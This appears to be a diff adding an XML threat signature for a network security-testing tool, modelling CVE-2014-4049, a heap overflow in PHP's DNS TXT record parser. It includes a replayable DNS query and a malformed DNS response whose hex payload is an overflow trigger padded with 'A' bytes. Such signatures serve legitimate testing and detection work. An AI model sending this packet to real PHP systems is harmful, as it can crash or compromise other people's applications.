@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="PHP php_parserr DNS_TXT Heap Buffer Overflow"/>
+    <EngDesc display="true" value="A heap buffer vulnerability exists in the php_parserr() function in PHP. The vulnerability is due to an error in parsing malformed DNS TXT records. &gt;An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="DNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="PHP_Group"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="PHP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_5.4.30/prior_to_5.5.14"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140616-01"/>
+    <CVEID display="true" value="CVE-2014-4049"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="107994"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="20b8592ce684d658d04da1457529be7b"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="PARTIAL"/>
+    <IntegImpact display="false" value="PARTIAL"/>
+    <AvailImpact display="false" value="PARTIAL"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635448372846420951"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="DNSdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="F"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0038" Identification="9AA0" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="3651" srcIP="172.16.8.235" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="58998" destPort="$DNSdestPort" checksum="E88D" length="0024" Payload="A7D3010000010000000000000674736C706F6303636F6D0000100001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0144" Identification="0000" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="CFE5" srcIP="$destIP" destIP="172.16.8.235" options="" CE="false" DF="true" MF="false">
+          <UDP srcPort="$DNSdestPort" destPort="58998" checksum="C734" length="0130" Payload="A7D3818000010001000000000674736C706F6303636F6D0000100001C00C001000017FFFFFFF0001FF414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
